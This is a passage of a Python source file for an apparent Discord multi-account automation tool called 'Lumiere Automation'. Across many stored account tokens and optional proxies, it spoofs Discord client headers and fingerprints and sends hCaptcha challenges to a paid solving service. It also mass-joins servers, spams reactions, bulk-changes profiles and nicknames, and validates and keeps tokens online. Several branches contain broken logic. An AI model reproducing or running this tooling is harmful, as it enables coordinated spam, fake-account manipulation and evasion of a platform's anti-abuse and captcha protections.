        obj = json.loads(data)

        # show values
        self.capKey = str(obj['key'])
        self.webhook = str(obj['webhook'])
        self.inv = inv
        self.token = token
        global headerrrrrrs
        headerrrrrrs = {
            ":authority": "discord.com",
            ":method": "POST",
            ":path": "/api/v9/invites/" + self.inv,
            ":scheme": "https",
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US",
            "Authorization": self.token,
            "content-length": str(len(self.inv)),
            "Connection": "keep-alive",
            "cache-control": "no-cache",
            "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
            "origin": "https://discord.com",
            'referer': 'https://discord.com/channels/@me',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "sec-ch-ua": "'Chromium';v='92', ' Not A;Brand';v='99', 'Google Chrome';v='92'",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.600 Chrome/91.0.4472.106 Electron/13.1.4 Safari/537.36",
            "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
            "x-debug-options": "bugReporterEnabled",
            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0=",
            "te": "trailers",
        }
        fingerprint = requests.get("https://discord.com/api/v9/experiments", headers=headrrrr, timeout=30).json()
        if "fingerprint" not in fingerprint:
            fingerprint = requests.get("https://discord.com/api/v9/experiments", headers=headrrrr, timeout=30).json()
        headerrrrrrs["x-fingerprint"] = fingerprint["fingerprint"]

    def joinServer(self):
        http.client._is_legal_header_name = re.compile(rb'[^\s][^:\r\n]*').fullmatch
        try:
            res = requests.post(f'https://discord.com/api/v9/invites/{self.inv}', json={"captcha_key": self.getCap()},
                                headers=headerrrrrrs)

            if res.status_code == 200:
                print(
                    f"{Fore.GREEN}[+]{Fore.RESET} Done {self.token}")
            else:
                print(
                    f"{Fore.RED}[-]{Fore.RESET} Error")
        except:
            pass

    def getCap(self):
        solvedCaptcha = None
        captchaKey = self.capKey
        taskId = ""
        taskId = httpx.post(f"https://api.{captchaApi}/createTask", json={"clientKey": captchaKey,
                                                                          "task": {"type": "HCaptchaTaskProxyless",
                                                                                   "websiteURL": "https://discord.com/",
                                                                                   "websiteKey": "4c672d35-0701-42b2-88c3-78380b0db560",
                                                                                   "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0"}},
                            timeout=30).json()
        if taskId.get("errorId") > 0:
            return None

        taskId = taskId.get("taskId")

        while not solvedCaptcha:
            captchaData = httpx.post(f"https://api.{captchaApi}/getTaskResult",
                                     json={"clientKey": captchaKey, "taskId": taskId}, timeout=30).json()
            if captchaData.get("status") == "ready":
                solvedCaptcha = captchaData.get("solution").get("gRecaptchaResponse")
                return solvedCaptcha

clearintro = lambda: os.system('')
clearintro()

login = True

version = "1.2.5"
print(version)
clear = lambda: os.system('cls')
clear()

from datetime import datetime

now = datetime.now()

current_time = now.strftime("%H:%M:%S")

ur = ''
title = f'Lumiere Automation - Version {version}'
system(f'title {title}')
tokens = open('input/tokens.txt', 'r').read().splitlines()

rs = requests.Session()

import json
from itertools import islice

settings = open('config.json')
config = json.load(settings)

tokens_type = "token"

proxies = open('input/proxies.txt', 'r').read().splitlines()

if tokens_type.lower() != "combo":
    tokens = open("input/tokens.txt", 'r').read().splitlines()
    total_token = len(tokens)
else:
    tokens = open("input/tokens.txt", "r").read()
    total_token = len(tokens.splitlines())

def randstr(lenn):
    alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
    text = ''
    for i in range(0, lenn):
        text += alpha[random.randint(0, len(alpha) - 1)]
    return text

with open("config.json") as json_data_file:
    data = json.load(json_data_file)
    webhook1 = data["webhook"]


if login == True:
    askpro = input('Do you want to use proxy y/n: ').lower()

    def spammer():
        from pypresence import Presence
        import time
        client_id = '941045700169449542'
        RPC = Presence(client_id)
        RPC.connect()

        print(RPC.update(state="Destroying WL", large_image="lumiere",
                             large_text="Lumiere Automation", details="Version 1.2.5", start=time.time()))

        clear = lambda: os.system('cls')
        clear()

        colorama.init()
        print("""                              
  _     _    _ __  __ _____ ______ _____  ______ 
 | |   | |  | |  \/  |_   _|  ____|  __ \|  ____|
 | |   | |  | | \  / | | | | |__  | |__) | |__   
 | |   | |  | | |\/| | | | |  __| |  _  /|  __|  
 | |___| |__| | |  | |_| |_| |____| | \ \| |____ 
 |______\____/|_|  |_|_____|______|_|  \_\______|

---------------------------------------------------------------------
---------------------------------------------------------------------                                                                                                                                                                         
    """)

        print(
            f'{Fore.LIGHTCYAN_EX}║{Fore.RESET}{Fore.LIGHTCYAN_EX}[01]{Fore.RESET} Reaction Adder                  {Fore.LIGHTCYAN_EX}║{Fore.RESET}{Fore.LIGHTCYAN_EX}[09]{Fore.RESET} Nickname Changer (Bulk) {Fore.LIGHTCYAN_EX}║{Fore.RESET} ')
        print(
            f'{Fore.LIGHTCYAN_EX}║{Fore.RESET}{Fore.LIGHTCYAN_EX}[02]{Fore.RESET} About/Activity Changer          {Fore.LIGHTCYAN_EX}║{Fore.RESET}{Fore.LIGHTCYAN_EX}[10]{Fore.RESET} Nickname Scraper        {Fore.LIGHTCYAN_EX}║{Fore.RESET} ')
        print(
            f'{Fore.LIGHTCYAN_EX}║{Fore.RESET}{Fore.LIGHTCYAN_EX}[03]{Fore.RESET} Server Joiner                   {Fore.LIGHTCYAN_EX}║{Fore.RESET}{Fore.LIGHTCYAN_EX}[11]{Fore.RESET} Message Sender          {Fore.LIGHTCYAN_EX}║{Fore.RESET} ')
        print(
            f'{Fore.LIGHTCYAN_EX}║{Fore.RESET}{Fore.LIGHTCYAN_EX}[04]{Fore.RESET} Server Leaver                   {Fore.LIGHTCYAN_EX}║{Fore.RESET}{Fore.LIGHTCYAN_EX}[12]{Fore.RESET} Message Scraper         {Fore.LIGHTCYAN_EX}║{Fore.RESET} ')
        print(
            f'{Fore.LIGHTCYAN_EX}║{Fore.RESET}{Fore.LIGHTCYAN_EX}[05]{Fore.RESET} Token Checker                   {Fore.LIGHTCYAN_EX}║{Fore.RESET}{Fore.LIGHTCYAN_EX}[13]{Fore.RESET} Token Login             {Fore.LIGHTCYAN_EX}║{Fore.RESET} ')
        print(
            f'{Fore.LIGHTCYAN_EX}║{Fore.RESET}{Fore.LIGHTCYAN_EX}[06]{Fore.RESET} Token Onliner                   {Fore.LIGHTCYAN_EX}║{Fore.RESET}{Fore.LIGHTCYAN_EX}[14]{Fore.RESET} Token Format            {Fore.LIGHTCYAN_EX}║{Fore.RESET} ')
        print(
            f'{Fore.LIGHTCYAN_EX}║{Fore.RESET}{Fore.LIGHTCYAN_EX}[07]{Fore.RESET} Hypesquad Claimer               {Fore.LIGHTCYAN_EX}║{Fore.RESET}{Fore.LIGHTCYAN_EX}[15]{Fore.RESET} Avatar Changer          {Fore.LIGHTCYAN_EX}║{Fore.RESET} ')
        print(
            f'{Fore.LIGHTCYAN_EX}║{Fore.RESET}{Fore.LIGHTCYAN_EX}[08]{Fore.RESET} Nickname Changer (Input)        {Fore.LIGHTCYAN_EX}║{Fore.RESET}{Fore.LIGHTCYAN_EX}[16]{Fore.RESET} Giveaway Checker        {Fore.LIGHTCYAN_EX}║{Fore.RESET} ')
        print(""" """)
        choice = input('Which module would you like to use? ')


        if choice == '1':
            askthreads  = int(input('How much threads do you wanna use?: '))
            threads = []

            addremreaction = input('add/rem: ').lower()
            print(
f'''
{Fore.LIGHTMAGENTA_EX}[1]{Fore.RESET} Normal Reaction Spammer
{Fore.LIGHTMAGENTA_EX}[2]{Fore.RESET} Nitro Reaction Spammer
'''
            )
            nitro_emoji = input('[?]>').lower()
            if nitro_emoji == '1':
                def reaction(chd, iddd, org, token):
                    chd = chd.split("//")
                    chd = chd[1].split('/')
                    headers = {'Content-Type': 'application/json',
                               'Accept': '*/*',
                               'Accept-Encoding': 'gzip, deflate, br',
                               'Accept-Language': 'en-US',
                               'Cookie': f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                               'DNT': '1',
                               'origin': 'https://discord.com',
                               "sec-fetch-dest": "empty",
                               "sec-fetch-mode": "cors",
                               "sec-fetch-site": "same-origin",
                               'TE': 'Trailers',
                               'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9',
                               'authorization': token,
                               'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
                               }

                    emoji = ej.emojize(org, use_aliases=True)

                    if addremreaction == 'add':
                        a = rs.put(
                            f"https://discordapp.com/api/v9/channels/{chd[2]}/messages/{iddd}/reactions/{emoji}/@me",
                            headers=headers)
                        if a.status_code == 204:
                            print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Reaction {org} added! ")
                        else:
                            print(f"{Fore.LIGHTRED_EX}[-]{Fore.RESET} Error")
                    elif addremreaction == 'rem':
                        a = rs.delete(
                            f"https://discordapp.com/api/v9/channels/{chd[2]}/messages/{iddd}/reactions/{emoji}/@me",
                            headers=headers)
                        if a.status_code == 204:
                            print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Reaction {org} removed! ")
                        else:
                            print(f"{Fore.LIGHTRED_EX}[-]{Fore.RESET} Error")

                    asktokens = input('Do you want to use all tokens from tokens.txt? y/n: ')
                    if asktokens == 'y':
                        tokens = open('tokens.txt', 'r').read().splitlines()
                        chd = input('Channel: ')
                        iddd = input('Message ID: ')
                        emoji = input('Emoji: ')
                        delay = int(input('Delay: '))
                        for token in tokens:
                            time.sleep(delay)
                            threading.Thread(target=reaction, args=(chd, iddd, emoji, token)).start()
                    else:

                        howmany = int(input('How many tokens do you wanna use?: '))
                        chd = input('Channel ID: ')
                        iddd = input('Message ID: ')
                        emoji = input('Emoji: ')
                        delay = int(input('Delay: '))
                        with open("tokens.txt") as myfile:
                            head = list(islice(myfile, howmany))

                        def start(n):
                            for token in head:
                                time.sleep(delay)
                                threading.Thread(target=reaction, args=(chd, iddd, emoji, token)).start()

                        for n in range(1, askthreads):
                            t = Thread(target=start, args=(n,))
                            threads.append(t)
                            t.start()
            else:
                def reaction(chd, iddd, emoji, token):
                    # chd = chd.split("//")
                    # chd = chd[1].split('/')
                    headers = {'Content-Type': 'application/json',
                               'Accept': '*/*',
                               'Accept-Encoding': 'gzip, deflate, br',
                               'Accept-Language': 'en-US',
                               'Cookie': f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                               'DNT': '1',
                               'origin': 'https://discord.com',
                               "sec-fetch-dest": "empty",
                               "sec-fetch-mode": "cors",
                               "sec-fetch-site": "same-origin",
                               'TE': 'Trailers',
                               'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9',
                               'authorization': token,
                               'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
                               }

                    if addremreaction == 'add':
                        a = rs.put(
                            f"https://discordapp.com/api/v9/channels/{chd}/messages/{iddd}/reactions/{emoji}/@me",
                            headers=headers)
                        if a.status_code == 204:
                            print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Reaction {emoji} added! ")
                        else:
                            print(f"{Fore.LIGHTRED_EX}[-]{Fore.RESET} Error")
                    elif addremreaction == 'rem':
                        a = rs.delete(
                            f"https://discordapp.com/api/v9/channels/{chd}/messages/{iddd}/reactions/{emoji}/@me",
                            headers=headers)
                        if a.status_code == 204:
                            print(f"{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Reaction {emoji} removed! ")
                        else:
                            print(f"{Fore.LIGHTRED_EX}[-]{Fore.RESET} Error")

                asktokens = input('Do you want to use all tokens from tokens.txt? y/n: ')
                if asktokens == 'y':
                    tokens = open('tokens.txt', 'r').read().splitlines()
                    chd = input('Channel: ')
                    iddd = input('Message ID: ')
                    emoji = input('Emoji: ')
                    delay = int(input('Delay: '))
                    for token in tokens:
                        time.sleep(delay)
                        threading.Thread(target=reaction, args=(chd, iddd, emoji, token)).start()
                else:

                    howmany = int(input('How many tokens do you wanna use?: '))
                    chd = input('Channel ID: ')
                    iddd = input('Message ID: ')
                    emoji = input('Emoji: ')
                    delay = int(input('Delay: '))
                    with open("tokens.txt") as myfile:
                        head = list(islice(myfile, howmany))
                    for token in head:
                        time.sleep(delay)
                        threading.Thread(target=reaction, args=(chd, iddd, emoji, token)).start()


            time.sleep(5)
            exit = input(f'press any key: ')
            exit = clear()
            exit = spammer()

            



        elif choice == '2':

            http.client._is_legal_header_name = re.compile(b'[^\\s][^:\\r\\n]*').fullmatch
            print(f'{Fore.LIGHTCYAN_EX}[1]{Fore.RESET} About Changer')
            print(f'{Fore.LIGHTCYAN_EX}[2]{Fore.RESET} Activity Status Changer')
            changg = input('[?]>')
            if changg == '1':

                def abouttt(token, abbb):
                    try:
                        headers = secondHeader(token)
                        rd = rs.patch('https://discord.com/api/v9/users/@me', headers=headers, json={'bio': abbb})
                        if rd.status_code == 201 or rd.status_code == 204:
                            print(
                                f"{Fore.LIGHTGREEN_EX} [+] {token[:50]}****** about changed!{Fore.RESET}")
                        else:
                            print(
                                f"{Fore.LIGHTRED_EX} [!] {token[:50]}****** about not changed! {Fore.RESET}({Fore.LIGHTBLACK_EX}{rd.content}{Fore.RESET})")

                    except:
                        print('Error...')

                askusetokens = input('Do you want to use tokens from tokens.txt file? y/n: ').lower()
                ab = input('About: ')
                if askusetokens == 'y':
                    asktokens = input('Do you want to use all tokens from tokens.txt? y/n: ')
                    if asktokens == 'y':
                        tokens = open('input/tokens.txt', 'r').read().splitlines()
                        for token in tokens:
                            threading.Thread(target=abouttt, args=(token, ab)).start()
                    else:
                        howmany = int(input('How many tokens do you wanna use?: '))
                        with open("input/tokens.txt") as myfile:
                            head = list(islice(myfile, howmany))
                        for token in head:
                            threading.Thread(target=abouttt, args=(token, ab)).start()
                elif askusetokens == 'n':
                    token = input('Token: ')
                    threading.Thread(target=abouttt, args=(token, ab)).start()
                else:
                    token = input('Token: ')
                    threading.Thread(target=abouttt, args=(token, ab)).start()

            if changg == '2':
                def activity(token, act):
                    ws = websocket.WebSocket()
                    actt = 'Online'
                    ws.connect('wss://gateway.discord.gg/?v=6&encoding=json')
                    gjs = {'name': act,
                           'type': 0}
                    auth = {'op': 2,
                            'd': {'token': token,
                                  'properties': {'$os': sys.platform,       
                                                 '$browser': 'RTB',
                                                 '$device': f"{sys.platform} Device"},
                                  'presence': {'game': gjs,
                                               'status': actt,
                                               'since': 0,
                                               'afk': False}},
                            's': None,
                            't': None}
                    ws.send(json.dumps(auth))
                    print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Activity Status: {act}')

                askusetokens = input('Do you want to use tokens from tokens.txt file? y/n: ').lower()
                text = input('Activity Status: ')
                if askusetokens == 'y':
                    asktokens = input('Do you want to use all tokens from tokens.txt? y/n: ')
                    if asktokens == 'y':
                        tokens = open('input/tokens.txt', 'r').read().splitlines()
                        for token in tokens:
                            threading.Thread(target=abouttt, args=(token, ab)).start()
                    else:
                        howmany = int(input('How many tokens do you wanna use?: '))
                        with open("input/tokens.txt") as myfile:
                            head = list(islice(myfile, howmany))
                        for token in head:
                            threading.Thread(target=activity, args=(token, text)).start()
                    tokens = open('input/tokens.txt', 'r').read().splitlines()
                elif askusetokens == 'n':
                    tokens = input('Token: ')
                    threading.Thread(target=activity, args=(tokens)).start()
                else:
                    tokens = input('Token: ')
                    threading.Thread(target=activity, args=(tokens)).start()

            time.sleep(3)

            time.sleep(5)
            exit = input(f'press any key: ')
            exit = clear()
            exit = spammer()

        elif choice == '3':

            jooinner()

            time.sleep(5)
            exit = input(f'press any key: ')
            exit = clear()
            exit = spammer()
                 

        elif choice == '4':
            token = ''
            askusetokens = input('Do you want to use tokens from tokens.txt file? y/n: ').lower()
            if askusetokens == 'y':
                asktokens = input('Do you want to use all tokens from tokens.txt? y/n: ')
                if asktokens == 'y':
                    tokens = open('input/tokens.txt', 'r').read().splitlines()
                    for tokenss in tokens:
                        token = tokenss
                else:
                    howmany = int(input('How many tokens do you wanna use?: '))
                    with open("input/tokens.txt") as myfile:
                        head = list(islice(myfile, howmany))
                    for tokenss in head:
                        token = tokenss

            ID = input(f'Discord Server ID: ')
            print(f"{Fore.LIGHTYELLOW_EX} {current_time} [+] Starting Task")

            apilink = "https://discord.com/api/v9/users/@me/guilds/" + str(ID)

            with open('input/tokens.txt', 'r') as handle:
                tokens = handle.readlines()
                for i in tokens:
                    token = i.rstrip()
                    headers = {
                        'Authorization': token,
                        "content-length": "0",
                        "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                        "origin": "https://discord.com",
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "same-origin",
                        "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.600 Chrome/91.0.4472.106 Electron/13.1.4 Safari/537.36",
                        "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
                        "x-debug-options": "bugReporterEnabled",
                        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="

                    }
                    if askpro == 'y':
                        proxy = random.choice(open("input/proxies.txt").read().splitlines())
                        req = rs.delete(apilink, headers=headers, proxies={"http": f"{proxy}"})
                    elif askpro == 'n':
                        req = rs.delete(apilink, headers=headers)
                    else:
                        req = rs.delete(apilink, headers=headers)
                    if req.status_code == 201 or req.status_code == 204:
                            print(
                                f"{Fore.LIGHTGREEN_EX} [+] {token[:50]}****** left server!{Fore.RESET}")
                    else:
                            print(
                                f"{Fore.LIGHTRED_EX} [!] {token[:50]}****** did not leave server! {Fore.RESET}({Fore.LIGHTBLACK_EX}{req.content}{Fore.RESET})")

            time.sleep(5)
            exit = input(f'Press enter to return to menu:')
            exit = clear()
            exit = spammer()

        elif choice == '5':

            def filter_tokens(unfiltered):
                tokens = []
                for line in [x.strip() for x in unfiltered.readlines() if x.strip()]:
                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                        for token in re.findall(regex, line):
                            if token not in tokens:
                                tokens.append(token)

                return tokens

            def checker(token):
                if askpro == 'y':
                    proxy = random.choice(open("input/proxies.txt").read().splitlines())
                    response = get(f'https://discordapp.com/api/v9/users/@me/library',
                                   headers={'Authorization': token}, proxies={"http": f"{proxy}"})
                elif askpro == 'n':
                    response = get(f'https://discordapp.com/api/v9/users/@me/library',
                                   headers={'Authorization': token})
                else:  
                    response = get(f'https://discordapp.com/api/v9/users/@me/library',
                                   headers={'Authorization': token})
                if "You need to verify your account in order to perform this action." in str(
                        response.content) or "401: Unauthorized" in str(response.content):
                    return False
                elif response.status_code == 401:
                    return 'Invalid'
                else:
                    return True

            def manager():
                if __name__ == "__main__":
                    try:
                        checked = []
                        with open('input/tokens.txt', 'r') as tokens:
                            filtered = filter_tokens(tokens)
                            filtr = len(filtered)
                            for token in filtered:
                                if len(token) > 15 and token not in checked and checker(token) == True:
                                    print(f'{Fore.LIGHTGREEN_EX}[+] {Fore.RESET}{token} Valid')
                                    checked.append(token)
                                else:
                                    print(f'{Fore.LIGHTRED_EX}[-] {Fore.RESET}{token} Invalid')
                        if len(checked) > 0:
                            save = input(
                                f'{len(checked)} {Fore.LIGHTGREEN_EX}Valid{Fore.RESET}\nDo you want to Save only Valid tokens? (y/n): ').lower()
                            if save == 'y':
                                name = 'tokens'
                                with open(f'input/{name}.txt', 'w') as saveFile:
                                    saveFile.write('\n'.join(checked))
                                print(f'{Fore.LIGHTGREEN_EX}[+]{Fore.RESET} Tokens saved to {name}.txt file!')
                    except:
                        print(f'{Fore.LIGHTRED_EX}[-]{Fore.RESET} Error, cant open tokens.txt file...... :(!')

            start = input('press any key to start: ')
            start = manager()

            time.sleep(5)
            exit = input('press any key: ')
            exit = clear()
            exit = spammer()

        elif choice == '6':
            print(f'{Fore.LIGHTCYAN_EX}[1]{Fore.RESET} Online')
            print(f'{Fore.LIGHTCYAN_EX}[2]{Fore.RESET} Do Not Disturb')
            print(f'{Fore.LIGHTCYAN_EX}[3]{Fore.RESET} Idle')
            onlinr = int(input('[?]> '))

            tuk = []

            tokens = open("input/tokens.txt", "r").read().splitlines()

            asc = asyncio.new_event_loop()
            asyncio.set_event_loop(asc)

            if onlinr == 1:
                for token in tokens:
                    print(f"{Fore.LIGHTYELLOW_EX} {current_time} [+] Starting Task")
                    bottuk = discord.Client(status=discord.Status.online)
                    asc.create_task(bottuk.start(token, bot=False))
                    tuk.append(bottuk)
                    print(f"{Fore.LIGHTGREEN_EX} [+] {token[:50]}****** online!{Fore.RESET}")
            if onlinr == 2:
                for token in tokens:
                    print(f"{Fore.LIGHTYELLOW_EX} {current_time} [+] Starting Task")
                    bottuk = discord.Client(status=discord.Status.do_not_disturb)
                    asc.create_task(bottuk.start(token, bot=False))
                    tuk.append(bottuk)
                    print(f"{Fore.LIGHTGREEN_EX} [+] {token[:50]}****** online!{Fore.RESET}")
            if onlinr == 3:
                for token in tokens:
                    print(f"{Fore.LIGHTYELLOW_EX} {current_time} [+] Starting Task")
                    bottuk = discord.Client(status=discord.Status.idle)
                    asc.create_task(bottuk.start(token, bot=False))
                    tuk.append(bottuk)
                    print(f"{Fore.LIGHTGREEN_EX} [+] {token[:50]}****** online!{Fore.RESET}")

            threading.Thread(target=asc.run_forever).start()

            time.sleep(5)
            exit = input('Press enter to return to menu:')
            exit = clear()
            exit = spammer()

        elif choice == '7':

            print(f'''{Fore.LIGHTCYAN_EX}[1] {Fore.RESET}{Fore.MAGENTA}Bravery{Fore.RESET}
{Fore.LIGHTCYAN_EX}[2] {Fore.RESET}{Fore.LIGHTCYAN_EX}Brilliance{Fore.RESET}
{Fore.LIGHTCYAN_EX}[3] {Fore.RESET}{Fore.LIGHTCYAN_EX}Balance{Fore.RESET}
{Fore.LIGHTCYAN_EX}[4] {Fore.RESET}Leave The HypeSquad''')

            house = input("Choice: ")

            def hype(token):
                headers = mainHeader(token)

                if house == "1":
                    housefinal = '1'
                    print(f"{Fore.LIGHTYELLOW_EX} {current_time} [+] Starting Task")

                if house == "2":
                    housefinal = '2'
                    print(f"{Fore.LIGHTYELLOW_EX} {current_time} [+] Starting Task")

                if house == "3":
                    housefinal = '3'
                    print(f"{Fore.LIGHTYELLOW_EX} {current_time} [+] Starting Task")

                if house == '4':
                    housefinal = None
                    print(f"{Fore.LIGHTYELLOW_EX} {current_time} [+] Starting Task")

                if house == '1' or '2' or '3':
                    payload = {
                        'house_id': housefinal
                    }
                    if askpro == 'y':
                        proxy = random.choice(open("input/proxies.txt").read().splitlines())
                        rep = rs.post("https://discord.com/api/v9/hypesquad/online", json=payload, headers=headers,
                                      proxies={"http": f"{proxy}"})
                    elif askpro == 'n':
                        rep = rs.post("https://discord.com/api/v9/hypesquad/online", json=payload, headers=headers)
                    else:
                        rep = rs.post("https://discord.com/api/v9/hypesquad/online", json=payload, headers=headers)
                    if rep.status_code == 201 or rep.status_code == 204:
                            print(
                                f"{Fore.LIGHTGREEN_EX} [+] {token[:50]}****** joined hypesquad!{Fore.RESET}")
                    else:
                            print(
                                f"{Fore.LIGHTRED_EX} [!] {token[:50]}****** did not join hypesquad! {Fore.RESET}({Fore.LIGHTBLACK_EX}{rep.content}{Fore.RESET})")

                if house == '4':
                    payload = {
                        'house_id': housefinal
                    }
                    if askpro == 'y':
                        proxy = random.choice(open("input/proxies.txt").read().splitlines())
                        req = rs.delete('https://discord.com/api/v9/hypesquad/online', headers=headers, json=payload,
                                        proxies={"http": f"{proxy}"})
                    elif askpro == 'n':
                        req = rs.delete('https://discord.com/api/v9/hypesquad/online', headers=headers, json=payload)
                    else:
                        req = rs.delete('https://discord.com/api/v9/hypesquad/online', headers=headers, json=payload)
                    if req.status_code == 201 or req.status_code == 204:
                            print(
                                f"{Fore.LIGHTGREEN_EX} [+] {token[:50]}****** left hypesquad!{Fore.RESET}")
                    else:
                        pass

                else:
                    pass
            askusetokens = input('Do you want to use tokens from tokens.txt file? y/n: ').lower()
            if askusetokens == 'y':
                askusetokens3 = input('Do you want to use tokens from tokens.txt file? y/n: ').lower()
                if askusetokens3 == 'y':
                    askusetokens = input('Do you want to use tokens from tokens.txt file? y/n: ').lower()
                    if askusetokens == 'y':
                        asktokens = input('Do you want to use all tokens from tokens.txt? y/n: ')
                        if asktokens == 'y':
                            tokens = open('input/tokens.txt', 'r').read().splitlines()
                            for token in tokens:
                                threading.Thread(target=hype(token)).start()
                        else:
                            howmany = int(input('How many tokens do you wanna use?: '))
                            with open("input/tokens.txt") as myfile:
                                head = list(islice(myfile, howmany))
                            for token in head:
                                threading.Thread(target=hype(token)).start()
            elif askusetokens == 'n':
                tokens = input('Token: ')
                threading.Thread(target=hype(tokens)).start()
            else:
                tokens = input('Token: ')
                threading.Thread(target=hype(tokens)).start()

            time.sleep(5)
            exit = input('press any key: ')
            exit = clear()
            exit = spammer()

        elif choice == '8':
            def changenick(server, nickname, token):
                headers = mainHeader(token)
                if askpro == 'y':
                    proxy = random.choice(open("input/proxies.txt").read().splitlines())
                    r = rs.patch(f"https://discord.com/api/v9/guilds/{server}/members/@me/nick", headers=headers,
                                 json={"nick": nickname}, proxies={"http": f"{proxy}"})
                elif askpro == 'n':
                    r = rs.patch(f"https://discord.com/api/v9/guilds/{server}/members/@me/nick", headers=headers,
                                 json={"nick": nickname})
                else:
                    r = rs.patch(f"https://discord.com/api/v9/guilds/{server}/members/@me/nick", headers=headers,
                                 json={"nick": nickname})
                if r.status_code == 201 or r.status_code == 204:
                            print(
                                f"{Fore.LIGHTGREEN_EX} [+] {token[:50]}****** nickname changed!{Fore.RESET}")
                else:
                            print(
                                f"{Fore.LIGHTRED_EX} [!] {token[:50]}****** could not change nickname! {Fore.RESET}({Fore.LIGHTBLACK_EX}{r.content}{Fore.RESET})")

            askusetokens3 = input('Do you want to use tokens from tokens.txt file? y/n: ').lower()
            server = input("Server ID: ")
            nick = input("Nickname: ")
            if askusetokens3 == 'y':
                askusetokens = input('Do you want to use tokens from tokens.txt file? y/n: ').lower()
                if askusetokens == 'y':
                    asktokens = input('Do you want to use all tokens from tokens.txt? y/n: ')
                    if asktokens == 'y':
                        tokens = open('input/tokens.txt', 'r').read().splitlines()
                        print(f"{Fore.LIGHTYELLOW_EX} {current_time} [+] Starting Task")
                        for token in tokens:
                            threading.Thread(target=changenick, args=(server, nick, token)).start()
                    else:
                        howmany = int(input('How many tokens do you wanna use?: '))
                        print(f"{Fore.LIGHTYELLOW_EX} {current_time} [+] Starting Task")
                        with open("input/tokens.txt") as myfile:
                            head = list(islice(myfile, howmany))
                        for token in head:
                            threading.Thread(target=changenick, args=(server, nick, token)).start()
            
            elif askusetokens3 == 'n':
                tokens = input('Token: ')
